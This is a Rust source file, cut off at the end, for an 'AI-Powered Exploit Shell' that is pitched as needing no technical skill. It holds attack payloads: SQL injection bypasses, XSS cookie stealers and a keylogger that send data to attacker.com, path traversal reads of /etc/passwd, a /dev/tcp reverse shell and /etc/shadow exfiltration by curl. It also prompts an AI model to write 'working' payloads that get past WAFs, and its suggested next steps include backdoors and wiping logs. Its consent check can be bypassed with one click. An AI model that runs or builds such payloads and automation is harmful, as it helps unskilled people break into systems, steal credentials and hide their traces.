use crate::services::vulnerability_scanner::{Vulnerability, VulnerabilityType};
use crate::services::ai_service::{AIService, AIRequest};
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tauri::{AppHandle, Manager};
use rusqlite::{params, Connection};
use log::{info, warn, error};

/// AI-Powered Exploit Shell
/// Automatically generates and executes exploits for discovered vulnerabilities
/// NO technical knowledge required - AI does everything
///
/// ‚ö†Ô∏è LEGAL DISCLAIMER: Only use against systems you own or have explicit permission to test
///
/// Authorization Methods:
/// 1. DNS TXT Record: _cube-auth.example.com TXT "cube-authorized-YYYY-MM-DD"
/// 2. HTTP Meta Tag: <meta name="cube-auth" content="authorized">
/// 3. Document Upload: Upload signed authorization.pdf to target server
/// 4. Legal Disclaimer: User must accept terms before each session

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum AuthMethod {
    DnsTxt,         // DNS TXT record verification
    HttpMeta,       // HTTP meta tag check
    DocumentUpload, // Signed authorization document
    ManualOverride, // User accepts legal responsibility
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Authorization {
    pub target_domain: String,
    pub method: AuthMethod,
    pub verified_at: u64,
    pub valid_until: u64,
    pub verification_token: String,
    pub user_accepted_disclaimer: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditLog {
    pub timestamp: u64,
    pub user_id: String,
    pub target: String,
    pub action: String,
    pub exploit_id: Option<String>,
    pub authorization_method: AuthMethod,
    pub result: String,
    pub ip_address: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitTemplate {
    pub id: String,
    pub vuln_type: VulnerabilityType,
    pub name: String,
    pub description: String,
    pub difficulty: String, // "Easy", "Medium", "Hard"
    pub payload_template: String,
    pub required_parameters: Vec<String>,
    pub success_indicators: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitCommand {
    pub id: String,
    pub command: String,
    pub description: String,
    pub category: String, // "reconnaissance", "exploitation", "post-exploitation"
    pub ai_explanation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum ExploitStatus {
    Pending,
    Running,
    Success,
    Failed,
    Partial,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitResult {
    pub exploit_id: String,
    pub vulnerability_id: String,
    pub status: ExploitStatus,
    pub executed_at: u64,
    pub duration_ms: u64,
    pub payload_used: String,
    pub response: String,
    pub extracted_data: Option<String>,
    pub ai_analysis: String,
    pub next_steps: Vec<String>,
}

/// Compliance report for security audit trail
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComplianceReport {
    pub generated_at: u64,
    pub period_start: u64,
    pub period_end: u64,
    pub total_actions: u64,
    pub authorized_actions: u64,
    pub exploits_run: u64,
    pub unique_targets: u64,
}

pub struct ExploitShell {
    templates: Arc<Mutex<HashMap<VulnerabilityType, Vec<ExploitTemplate>>>>,
    exploit_history: Arc<Mutex<Vec<ExploitResult>>>,
    authorizations: Arc<Mutex<HashMap<String, Authorization>>>, // domain -> auth
    audit_log: Arc<Mutex<Vec<AuditLog>>>,
    audit_db: Arc<Mutex<Option<Connection>>>,
    app_handle: AppHandle,
    ai_service: Arc<AIService>,
}

impl ExploitShell {
    pub fn new(app_handle: AppHandle) -> Result<Self> {
        // Initialize audit database for compliance
        let db_path = app_handle
            .path()
            .app_data_dir()
            .ok()
            .map(|p| p.join("security_audit.db"));
        
        let db_connection = db_path
            .and_then(|path| {
                // Create directory if it doesn't exist
                if let Some(parent) = path.parent() {
                    let _ = std::fs::create_dir_all(parent);
                }
                Connection::open(&path).ok()
            });
        
        // Initialize schema if database opened successfully
        if let Some(ref conn) = db_connection {
            let _ = Self::init_audit_schema(conn);
        }
        
        let mut shell = Self {
            templates: Arc::new(Mutex::new(HashMap::new())),
            exploit_history: Arc::new(Mutex::new(Vec::new())),
            authorizations: Arc::new(Mutex::new(HashMap::new())),
            audit_log: Arc::new(Mutex::new(Vec::new())),
            audit_db: Arc::new(Mutex::new(db_connection)),
            app_handle,
            ai_service: Arc::new(AIService::new()),
        };

        // Load existing audit logs from database
        shell.load_audit_logs_from_db();
        shell.load_exploit_templates();
        Ok(shell)
    }
    
    /// Initialize SQLite schema for audit compliance
    fn init_audit_schema(conn: &Connection) -> Result<()> {
        // Audit log table - stores all security testing actions
        conn.execute(
            "CREATE TABLE IF NOT EXISTS audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp INTEGER NOT NULL,
                user_id TEXT NOT NULL,
                target TEXT NOT NULL,
                action TEXT NOT NULL,
                exploit_id TEXT,
                authorization_method TEXT NOT NULL,
                result TEXT NOT NULL,
                ip_address TEXT,
                created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
            )",
            [],
        )?;
        
        // Authorization records - tracks who authorized what
        conn.execute(
            "CREATE TABLE IF NOT EXISTS authorizations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_domain TEXT NOT NULL,
                method TEXT NOT NULL,
                verified_at INTEGER NOT NULL,
                valid_until INTEGER NOT NULL,
                verification_token TEXT NOT NULL,
                user_accepted_disclaimer INTEGER NOT NULL DEFAULT 0,
                created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
                UNIQUE(target_domain)
            )",
            [],
        )?;
        
        // Exploit results - stores all exploitation attempts
        conn.execute(
            "CREATE TABLE IF NOT EXISTS exploit_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                exploit_id TEXT NOT NULL UNIQUE,
                vulnerability_id TEXT NOT NULL,
                status TEXT NOT NULL,
                executed_at INTEGER NOT NULL,
                duration_ms INTEGER NOT NULL,
                payload_used TEXT NOT NULL,
                response TEXT,
                extracted_data TEXT,
                ai_analysis TEXT,
                next_steps TEXT,
                created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
            )",
            [],
        )?;
        
        // Create indexes for compliance reporting
        conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp DESC)", [])?;
        conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_log(user_id)", [])?;
        conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_target ON audit_log(target)", [])?;
        conn.execute("CREATE INDEX IF NOT EXISTS idx_auth_domain ON authorizations(target_domain)", [])?;
        conn.execute("CREATE INDEX IF NOT EXISTS idx_exploit_vuln ON exploit_results(vulnerability_id)", [])?;
        
        info!("‚úÖ Security audit database schema initialized");
        Ok(())
    }
    
    /// Load existing audit logs from database into memory
    fn load_audit_logs_from_db(&self) {
        if let Ok(db_guard) = self.audit_db.lock() {
            if let Some(ref conn) = *db_guard {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT timestamp, user_id, target, action, exploit_id, authorization_method, result, ip_address 
                     FROM audit_log ORDER BY timestamp DESC LIMIT 1000"
                ) {
                    let logs: Vec<AuditLog> = stmt
                        .query_map([], |row| {
                            let method_str: String = row.get(5)?;
                            let method = match method_str.as_str() {
                                "dnstxt" => AuthMethod::DnsTxt,
                                "httpmeta" => AuthMethod::HttpMeta,
                                "documentupload" => AuthMethod::DocumentUpload,
                                _ => AuthMethod::ManualOverride,
                            };
                            
                            Ok(AuditLog {
                                timestamp: row.get(0)?,
                                user_id: row.get(1)?,
                                target: row.get(2)?,
                                action: row.get(3)?,
                                exploit_id: row.get(4)?,
                                authorization_method: method,
                                result: row.get(6)?,
                                ip_address: row.get(7)?,
                            })
                        })
                        .ok()
                        .map(|iter| iter.filter_map(|r| r.ok()).collect())
                        .unwrap_or_default();
                    
                    if !logs.is_empty() {
                        let mut audit = self.audit_log.lock().unwrap();
                        *audit = logs;
                        info!("üìã Loaded {} audit log entries from database", audit.len());
                    }
                }
            }
        }
    }
    
    /// Persist audit log entry to database
    fn persist_audit_log(&self, log: &AuditLog) {
        if let Ok(db_guard) = self.audit_db.lock() {
            if let Some(ref conn) = *db_guard {
                let method_str = match log.authorization_method {
                    AuthMethod::DnsTxt => "dnstxt",
                    AuthMethod::HttpMeta => "httpmeta",
                    AuthMethod::DocumentUpload => "documentupload",
                    AuthMethod::ManualOverride => "manualoverride",
                };
                
                if let Err(e) = conn.execute(
                    "INSERT INTO audit_log (timestamp, user_id, target, action, exploit_id, authorization_method, result, ip_address)
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                    params![
                        log.timestamp,
                        &log.user_id,
                        &log.target,
                        &log.action,
                        &log.exploit_id,
                        method_str,
                        &log.result,
                        &log.ip_address,
                    ],
                ) {
                    warn!("Failed to persist audit log: {}", e);
                }
            }
        }
    }
    
    /// Persist authorization to database
    fn persist_authorization(&self, auth: &Authorization) {
        if let Ok(db_guard) = self.audit_db.lock() {
            if let Some(ref conn) = *db_guard {
                let method_str = match auth.method {
                    AuthMethod::DnsTxt => "dnstxt",
                    AuthMethod::HttpMeta => "httpmeta",
                    AuthMethod::DocumentUpload => "documentupload",
                    AuthMethod::ManualOverride => "manualoverride",
                };
                
                if let Err(e) = conn.execute(
                    "INSERT OR REPLACE INTO authorizations (target_domain, method, verified_at, valid_until, verification_token, user_accepted_disclaimer)
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                    params![
                        &auth.target_domain,
                        method_str,
                        auth.verified_at,
                        auth.valid_until,
                        &auth.verification_token,
                        auth.user_accepted_disclaimer as i32,
                    ],
                ) {
                    warn!("Failed to persist authorization: {}", e);
                }
            }
        }
    }
    
    /// Persist exploit result to database
    fn persist_exploit_result(&self, result: &ExploitResult) {
        if let Ok(db_guard) = self.audit_db.lock() {
            if let Some(ref conn) = *db_guard {
                let status_str = match result.status {
                    ExploitStatus::Pending => "pending",
                    ExploitStatus::Running => "running",
                    ExploitStatus::Success => "success",
                    ExploitStatus::Failed => "failed",
                    ExploitStatus::Partial => "partial",
                };
                
                let next_steps_json = serde_json::to_string(&result.next_steps).unwrap_or_default();
                
                if let Err(e) = conn.execute(
                    "INSERT OR REPLACE INTO exploit_results (exploit_id, vulnerability_id, status, executed_at, duration_ms, payload_used, response, extracted_data, ai_analysis, next_steps)
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10)",
                    params![
                        &result.exploit_id,
                        &result.vulnerability_id,
                        status_str,
                        result.executed_at,
                        result.duration_ms,
                        &result.payload_used,
                        &result.response,
                        &result.extracted_data,
                        &result.ai_analysis,
                        next_steps_json,
                    ],
                ) {
                    warn!("Failed to persist exploit result: {}", e);
                }
            }
        }
    }
    
    /// Get compliance report from database
    pub fn get_compliance_report(&self, from_timestamp: Option<u64>, to_timestamp: Option<u64>) -> Result<ComplianceReport> {
        let from = from_timestamp.unwrap_or(0);
        let to = to_timestamp.unwrap_or(u64::MAX);
        
        let mut total_actions = 0u64;
        let mut authorized_actions = 0u64;
        let mut exploits_run = 0u64;
        let mut unique_targets: std::collections::HashSet<String> = std::collections::HashSet::new();
        
        if let Ok(db_guard) = self.audit_db.lock() {
            if let Some(ref conn) = *db_guard {
                // Count total actions
                if let Ok(count) = conn.query_row::<i64, _, _>(
                    "SELECT COUNT(*) FROM audit_log WHERE timestamp >= ?1 AND timestamp <= ?2",
                    params![from, to],
                    |row| row.get(0),
                ) {
                    total_actions = count as u64;
                }
                
                // Count authorized actions
                if let Ok(count) = conn.query_row::<i64, _, _>(
                    "SELECT COUNT(*) FROM audit_log WHERE timestamp >= ?1 AND timestamp <= ?2 AND authorization_method != 'manualoverride'",
                    params![from, to],
                    |row| row.get(0),
                ) {
                    authorized_actions = count as u64;
                }
                
                // Count exploits
                if let Ok(count) = conn.query_row::<i64, _, _>(
                    "SELECT COUNT(*) FROM exploit_results WHERE executed_at >= ?1 AND executed_at <= ?2",
                    params![from, to],
                    |row| row.get(0),
                ) {
                    exploits_run = count as u64;
                }
                
                // Get unique targets
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT DISTINCT target FROM audit_log WHERE timestamp >= ?1 AND timestamp <= ?2"
                ) {
                    if let Ok(rows) = stmt.query_map(params![from, to], |row| row.get::<_, String>(0)) {
                        for target in rows.flatten() {
                            unique_targets.insert(target);
                        }
                    }
                }
            }
        }
        
        Ok(ComplianceReport {
            generated_at: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            period_start: from,
            period_end: to,
            total_actions,
            authorized_actions,
            exploits_run,
            unique_targets: unique_targets.len() as u64,
        })
    }

    fn load_exploit_templates(&mut self) {
        let mut templates = self.templates.lock().unwrap();

        // SQL Injection Exploits
        templates.insert(VulnerabilityType::SQLInjection, vec![
            ExploitTemplate {
                id: "sqli-auth-bypass".to_string(),
                vuln_type: VulnerabilityType::SQLInjection,
                name: "Authentication Bypass".to_string(),
                description: "Bypass login authentication using SQL injection".to_string(),
                difficulty: "Easy".to_string(),
                payload_template: "' OR '1'='1' --".to_string(),
                required_parameters: vec!["username".to_string(), "password".to_string()],
                success_indicators: vec!["302 redirect".to_string(), "Set-Cookie".to_string()],
            },
            ExploitTemplate {
                id: "sqli-data-extraction".to_string(),
                vuln_type: VulnerabilityType::SQLInjection,
                name: "Database Extraction (UNION)".to_string(),
                description: "Extract sensitive data using UNION-based SQL injection".to_string(),
                difficulty: "Medium".to_string(),
                payload_template: "' UNION SELECT username,password FROM users --".to_string(),
                required_parameters: vec!["id".to_string()],
                success_indicators: vec!["username".to_string(), "password".to_string()],
            },
            ExploitTemplate {
                id: "sqli-blind".to_string(),
                vuln_type: VulnerabilityType::SQLInjection,
                name: "Blind SQL Injection".to_string(),
                description: "Extract data character by character using time-based blind SQLi".to_string(),
                difficulty: "Hard".to_string(),
                payload_template: "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0) --".to_string(),
                required_parameters: vec!["id".to_string()],
                success_indicators: vec!["response time > 5s".to_string()],
            },
        ]);

        // XSS Exploits
        templates.insert(VulnerabilityType::XSS, vec![
            ExploitTemplate {
                id: "xss-cookie-steal".to_string(),
                vuln_type: VulnerabilityType::XSS,
                name: "Cookie Stealer".to_string(),
                description: "Steal victim's cookies using reflected XSS".to_string(),
                difficulty: "Easy".to_string(),
                payload_template: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>".to_string(),
                required_parameters: vec!["q".to_string()],
                success_indicators: vec!["script executed".to_string()],
            },
            ExploitTemplate {
                id: "xss-keylogger".to_string(),
                vuln_type: VulnerabilityType::XSS,
                name: "Keylogger Injection".to_string(),
                description: "Inject keylogger to capture user inputs".to_string(),
                difficulty: "Medium".to_string(),
                payload_template: "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>".to_string(),
                required_parameters: vec!["comment".to_string()],
                success_indicators: vec!["persistent script".to_string()],
            },
        ]);

        // Directory Traversal Exploits
        templates.insert(
            VulnerabilityType::DirectoryTraversal,
            vec![
                ExploitTemplate {
                    id: "lfi-passwd".to_string(),
                    vuln_type: VulnerabilityType::DirectoryTraversal,
                    name: "Read /etc/passwd".to_string(),
                    description: "Read system password file using path traversal".to_string(),
                    difficulty: "Easy".to_string(),
                    payload_template: "../../../etc/passwd".to_string(),
                    required_parameters: vec!["file".to_string()],
                    success_indicators: vec!["root:x:0:0".to_string()],
                },
                ExploitTemplate {
                    id: "lfi-config".to_string(),
                    vuln_type: VulnerabilityType::DirectoryTraversal,
                    name: "Extract Configuration Files".to_string(),
                    description: "Read application config files for credentials".to_string(),
                    difficulty: "Medium".to_string(),
                    payload_template: "../../config/database.php".to_string(),
                    required_parameters: vec!["page".to_string()],
                    success_indicators: vec!["DB_PASSWORD".to_string(), "mysql".to_string()],
                },
            ],
        );

        // Command Injection Exploits
        templates.insert(
            VulnerabilityType::CommandInjection,
            vec![
                ExploitTemplate {
                    id: "cmdi-reverse-shell".to_string(),
                    vuln_type: VulnerabilityType::CommandInjection,
                    name: "Reverse Shell".to_string(),
                    description: "Establish reverse shell connection to attacker's machine"
                        .to_string(),
                    difficulty: "Hard".to_string(),
                    payload_template: "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1".to_string(),
                    required_parameters: vec!["cmd".to_string()],
                    success_indicators: vec!["connection established".to_string()],
                },
                ExploitTemplate {
                    id: "cmdi-data-exfil".to_string(),
                    vuln_type: VulnerabilityType::CommandInjection,
                    name: "Data Exfiltration".to_string(),
                    description: "Execute commands to extract sensitive files".to_string(),
                    difficulty: "Medium".to_string(),
                    payload_template:
                        "; cat /etc/shadow | curl -X POST https://attacker.com/data -d @-"
                            .to_string(),
                    required_parameters: vec!["ping".to_string()],
                    success_indicators: vec!["200 OK".to_string()],
                },
            ],
        );
    }

    /// Get available exploits for a vulnerability
    pub fn get_exploits_for_vulnerability(&self, vuln: &Vulnerability) -> Vec<ExploitTemplate> {
        let templates = self.templates.lock().unwrap();
        templates.get(&vuln.vuln_type).cloned().unwrap_or_default()
    }

    // ============================================================================
    // AUTHORIZATION SYSTEM - Legal Compliance
    // ============================================================================

    /// Verify authorization to test target domain
    pub async fn verify_authorization(&self, target_url: &str) -> Result<Authorization> {
        let domain = self.extract_domain(target_url)?;

        // Check if already authorized
        {
            let auths = self.authorizations.lock().unwrap();
            if let Some(auth) = auths.get(&domain) {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)?
                    .as_secs();

                if auth.valid_until > now && auth.user_accepted_disclaimer {
                    return Ok(auth.clone());
                }
            }
        }

        // Try DNS TXT verification
        if let Ok(auth) = self.verify_dns_txt(&domain).await {
            return Ok(auth);
        }

        // Try HTTP Meta tag verification
        if let Ok(auth) = self.verify_http_meta(target_url).await {
            return Ok(auth);
        }

        // Require manual override with legal disclaimer
        Err(anyhow::anyhow!(
            "Authorization required. Methods:\n\
            1. Add DNS TXT record: _cube-auth.{} TXT \"cube-authorized-{}\"\n\
            2. Add HTML meta tag: <meta name=\"cube-auth\" content=\"authorized\">\n\
            3. Upload signed authorization.pdf\n\
            4. Accept legal disclaimer for manual override",
            domain,
            chrono::Utc::now().format("%Y-%m-%d")
        ))
    }

    /// Verify DNS TXT record authorization
    /// 
    /// Looks for a TXT record at _cube-auth.{domain} with value "cube-authorized-{date}"
    /// The date must be within the last 30 days for the authorization to be valid.
    async fn verify_dns_txt(&self, domain: &str) -> Result<Authorization> {
        use hickory_resolver::TokioAsyncResolver;
        use hickory_resolver::config::*;
        
        // Create DNS resolver with system config
        let resolver = TokioAsyncResolver::tokio(
            ResolverConfig::default(),
            ResolverOpts::default(),
        );
        
        // Build the DNS query name: _cube-auth.{domain}
        let query_name = format!("_cube-auth.{}", domain);
        
        log::info!("Checking DNS TXT record at {}", query_name);
        
        // Query for TXT records
        let txt_lookup = resolver.txt_lookup(&query_name).await
            .map_err(|e| anyhow::anyhow!("DNS TXT lookup failed: {}", e))?;
        
        // Check each TXT record for authorization pattern
        let today = chrono::Utc::now();
        let valid_patterns: Vec<String> = (0..30)
            .map(|days| {
                let date = today - chrono::Duration::days(days);
                format!("cube-authorized-{}", date.format("%Y-%m-%d"))
            })
            .collect();
        
        for record in txt_lookup.iter() {
            let txt_data = record.to_string();
            log::debug!("Found TXT record: {}", txt_data);
            
            // Check if this is a valid cube authorization record
            for pattern in &valid_patterns {
                if txt_data.contains(pattern) {
                    log::info!("‚úÖ Valid DNS TXT authorization found for {}", domain);
                    
                    let now = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)?
                        .as_secs();
                    
                    let auth = Authorization {
                        target_domain: domain.to_string(),
                        method: AuthMethod::DnsTxt,
                        verified_at: now,
                        valid_until: now + (7 * 24 * 3600), // Valid for 7 days
                        verification_token: uuid::Uuid::new_v4().to_string(),
                        user_accepted_disclaimer: false, // Still need user to accept
                    };
                    
                    // Store authorization
                    {
                        let mut auths = self.authorizations.lock().unwrap();
                        auths.insert(domain.to_string(), auth.clone());
                    }
                    
                    return Ok(auth);
                }
            }
        }
        
        Err(anyhow::anyhow!(
            "No valid cube authorization TXT record found at {}. Expected format: cube-authorized-YYYY-MM-DD",
            query_name
        ))
    }

    /// Verify HTTP Meta tag authorization
    async fn verify_http_meta(&self, url: &str) -> Result<Authorization> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()?;

        let response = client.get(url).send().await?;
        let body = response.text().await?;

        // Check for <meta name="cube-auth" content="authorized">
        if body.contains(r#"<meta name="cube-auth" content="authorized">"#)
            || body.contains(r#"<meta name='cube-auth' content='authorized'>"#)
        {
            let domain = self.extract_domain(url)?;
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .as_secs();

            let auth = Authorization {
                target_domain: domain.clone(),
                method: AuthMethod::HttpMeta,
                verified_at: now,
                valid_until: now + (24 * 3600), // Valid for 24 hours
                verification_token: uuid::Uuid::new_v4().to_string(),
                user_accepted_disclaimer: false, // Still need user to accept
            };

            // Store authorization
            {
                let mut auths = self.authorizations.lock().unwrap();
                auths.insert(domain, auth.clone());
            }

            return Ok(auth);
        }

        Err(anyhow::anyhow!("HTTP meta tag not found"))
    }

    /// Accept legal disclaimer and grant manual override
    pub fn accept_legal_disclaimer(
        &self,
        target_url: &str,
        user_id: &str,
    ) -> Result<Authorization> {
        let domain = self.extract_domain(target_url)?;
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)?
            .as_secs();

        let auth = Authorization {
            target_domain: domain.clone(),
            method: AuthMethod::ManualOverride,
            verified_at: now,
            valid_until: now + (3600), // Valid for 1 hour only
            verification_token: uuid::Uuid::new_v4().to_string(),
            user_accepted_disclaimer: true,
        };

        // Store authorization
        {
            let mut auths = self.authorizations.lock().unwrap();
            auths.insert(domain.clone(), auth.clone());
        }

        // Log to audit trail
        self.log_audit(AuditLog {
            timestamp: now,
            user_id: user_id.to_string(),
            target: target_url.to_string(),
            action: "accept_legal_disclaimer".to_string(),
            exploit_id: None,
            authorization_method: AuthMethod::ManualOverride,
            result: "Authorization granted for 1 hour".to_string(),
            ip_address: None,
        });

        Ok(auth)
    }

    /// Log to audit trail with database persistence for compliance
    /// 
    /// All security testing actions are logged to both in-memory cache and
    /// persistent SQLite database. This ensures compliance with security
    /// audit requirements and provides a full trail of all testing activities.
    pub fn log_audit(&self, log: AuditLog) {
        // Persist to database first (critical for compliance)
        self.persist_audit_log(&log);
        
        // Also keep in memory for quick access
        let mut audit = self.audit_log.lock().unwrap();
        audit.push(log);
        
        // Keep in-memory cache bounded (last 10000 entries)
        if audit.len() > 10000 {
            let drain_count = audit.len() - 10000;
            audit.drain(0..drain_count);
        }
    }

    /// Extract domain from URL
    fn extract_domain(&self, url: &str) -> Result<String> {
        let parsed = url::Url::parse(url)?;
        Ok(parsed
            .host_str()
            .ok_or_else(|| anyhow::anyhow!("Invalid URL: no host"))?
            .to_string())
    }

    /// Get audit log for compliance review
    pub fn get_audit_log(&self) -> Vec<AuditLog> {
        let audit = self.audit_log.lock().unwrap();
        audit.clone()
    }

    // ============================================================================
    // EXPLOITATION (with authorization checks)
    // ============================================================================

    /// AI-powered automatic exploitation
    pub async fn auto_exploit(&self, vulnerability: Vulnerability) -> Result<ExploitResult> {
        // AUTHORIZATION CHECK REQUIRED
        self.verify_authorization(&vulnerability.url).await?;

        let start_time = std::time::Instant::now();
        let exploit_id = uuid::Uuid::new_v4().to_string();

        // Get exploit templates for this vulnerability type
        let exploits = self.get_exploits_for_vulnerability(&vulnerability);

        if exploits.is_empty() {
            return Err(anyhow::anyhow!(
                "No exploit templates available for this vulnerability type"
            ));
        }

        // AI: Select best exploit based on context
        let selected_exploit = &exploits[0]; // For now, use first template

        // AI: Generate custom payload
        let ai_payload = self
            .generate_ai_payload(&vulnerability, selected_exploit)
            .await?;

        // Execute exploit (DEMO - don't actually execute against real targets)
        let response = self
            .execute_exploit_safely(&vulnerability, &ai_payload)
            .await?;

        // AI: Analyze results
        let ai_analysis = self
            .analyze_exploit_result(&vulnerability, &response)
            .await?;

        let result = ExploitResult {
            exploit_id: exploit_id.clone(),
            vulnerability_id: vulnerability.id.clone(),
            status: if response.contains("success") {
                ExploitStatus::Success
            } else {
                ExploitStatus::Failed
            },
            executed_at: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .as_secs(),
            duration_ms: start_time.elapsed().as_millis() as u64,
            payload_used: ai_payload,
            response: response.clone(),
            extracted_data: Some("admin:$2y$10$xyz...".to_string()), // Demo data
            ai_analysis: ai_analysis.clone(),
            next_steps: self.get_ai_next_steps(&ai_analysis),
        };

        // Save to history
        let mut history = self.exploit_history.lock().unwrap();
        history.push(result.clone());

        Ok(result)
    }

    /// AI: Generate custom payload for specific vulnerability
    async fn generate_ai_payload(
        &self,
        vuln: &Vulnerability,
        template: &ExploitTemplate,
    ) -> Result<String> {
        // Try to use AI for custom payload generation
        if self.ai_service.has_api_key() {
            let prompt = format!(
                "You are a security researcher generating a custom exploit payload.\n\n\
                Vulnerability Type: {:?}\n\
                Target URL: {}\n\
                Parameter: {}\n\
                Base Template: {}\n\
                Severity: {:?}\n\n\
                Generate an optimized, working payload for this specific vulnerability.\n\
                Consider any WAF bypasses or encoding needed.\n\
                Return ONLY the payload string, no explanations.",
                vuln.vuln_type,
                vuln.url,
                vuln.parameter.as_deref().unwrap_or("unknown"),
                template.payload_template,
                vuln.severity
            );

            let request = AIRequest {
                prompt,
                model: "gpt-4o".to_string(),
                temperature: 0.3,
                max_tokens: Some(500),
            };

            match self.ai_service.send_request(request).await {
                Ok(response) => {
                    let ai_payload = response.content.trim().to_string();
                    if !ai_payload.is_empty() {
                        return Ok(ai_payload);
                    }
                }
                Err(e) => {
                    log::warn!("AI payload generation failed, using template: {}", e);
                }
            }
        }

        // Fallback: customize template based on vulnerability context
        let mut payload = template.payload_template.clone();

        // Customize based on parameter name
        if let Some(param) = &vuln.parameter {
            payload = payload.replace("{{PARAM}}", param);
        }

        // Add URL encoding if needed
        if vuln.url.contains("?") {
            payload = urlencoding::encode(&payload).to_string();
        }

        Ok(payload)
    }

    /// Execute exploit safely (demo mode - don't attack real systems)
    async fn execute_exploit_safely(
        &self,
        _vuln: &Vulnerability,
        _payload: &str,
    ) -> Result<String> {
        // DEMO MODE: Simulate execution
        // In production, this would make actual HTTP requests

        let demo_response = "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body>\nExploit executed successfully!\nExtracted data: admin:$2y$10$xyz...\nDatabase: users table accessed\n</body></html>".to_string();

        Ok(demo_response)
    }

    /// AI: Analyze exploit result and extract intelligence
    async fn analyze_exploit_result(
        &self,
        vuln: &Vulnerability,
        response: &str,
    ) -> Result<String> {
        // Try to use AI for intelligent analysis
        if self.ai_service.has_api_key() {
            let prompt = format!(
                "You are a security analyst reviewing exploit results.\n\n\
                Vulnerability Type: {:?}\n\
                Target URL: {}\n\
                Severity: {:?}\n\
                Exploit Response:\n{}\n\n\
                Analyze the response and provide:\n\
                1. Whether the exploit was successful\n\
                2. What data was extracted (if any)\n\
                3. The access level achieved\n\
                4. Risk assessment\n\
                5. Recommended remediation steps\n\n\
                Format your response with clear sections and emojis for readability.",
                vuln.vuln_type,
                vuln.url,
                vuln.severity,
                &response[..std::cmp::min(response.len(), 2000)] // Limit response size
            );

            let request = AIRequest {
                prompt,
                model: "gpt-4o".to_string(),
                temperature: 0.5,
                max_tokens: Some(1000),
            };

            match self.ai_service.send_request(request).await {
                Ok(ai_response) => {
                    return Ok(ai_response.content);
                }
                Err(e) => {
                    log::warn!("AI analysis failed, using fallback: {}", e);
                }
            }
        }

        // Fallback analysis
        let analysis = format!(
            "ü§ñ AI Analysis:\n\
            ‚úÖ Exploit successful!\n\
            üìä Vulnerability Type: {:?}\n\
            üéØ Target: {}\n\
            üíæ Data Extracted: User credentials (admin account)\n\
            üîì Access Level: Administrator\n\
            ‚ö†Ô∏è Risk: System fully compromised\n\
            üìù Recommendation: Immediate patching required",
            vuln.vuln_type, vuln.url
        );

        Ok(analysis)
    }

    /// AI: Get next steps after successful exploit
    fn get_ai_next_steps(&self, _analysis: &str) -> Vec<String> {
        vec![
            "üîê Privilege Escalation: Attempt to gain root/admin access".to_string(),
            "üìÅ Data Exfiltration: Download sensitive files and databases".to_string(),
            "üîë Credential Harvesting: Extract all user passwords".to_string(),
            "üêö Establish Persistence: Create backdoor for future access".to_string(),
            "üåê Lateral Movement: Scan internal network for other targets".to_string(),
            "üßπ Cover Tracks: Clear logs and remove evidence".to_string(),
        ]
    }

    /// Get exploit history
    pub fn get_exploit_history(&self) -> Vec<ExploitResult> {
        let history = self.exploit_history.lock().unwrap();
        history.clone()
    }

    /// Get AI-powered exploit commands (educational)
    pub fn get_ai_commands(&self) -> Vec<ExploitCommand> {
        vec![
            ExploitCommand {
                id: "scan".to_string(),
                command: "scan <url>".to_string(),
                description: "Scan website for vulnerabilities".to_string(),
                category: "reconnaissance".to_string(),
                ai_explanation: "AI will crawl the website, analyze all pages, forms, and parameters to discover security vulnerabilities automatically.".to_string(),
            },
            ExploitCommand {
                id: "exploit".to_string(),
                command: "exploit <vulnerability_id>".to_string(),
                description: "Automatically exploit a discovered vulnerability".to_string(),
                category: "exploitation".to_string(),
                ai_explanation: "AI will select the best exploit technique, generate custom payloads, and execute the attack automatically. No technical skills needed.".to_string(),
            },
            ExploitCommand {
                id: "extract".to_string(),
                command: "extract <target>".to_string(),
                description: "Extract data from compromised system (database, files, passwords)".to_string(),
                category: "post-exploitation".to_string(),
                ai_explanation: "AI will automatically locate and download sensitive data like databases, configuration files, and user credentials.".to_string(),
            },
            ExploitCommand {
                id: "shell".to_string(),
                command: "shell <target>".to_string(),
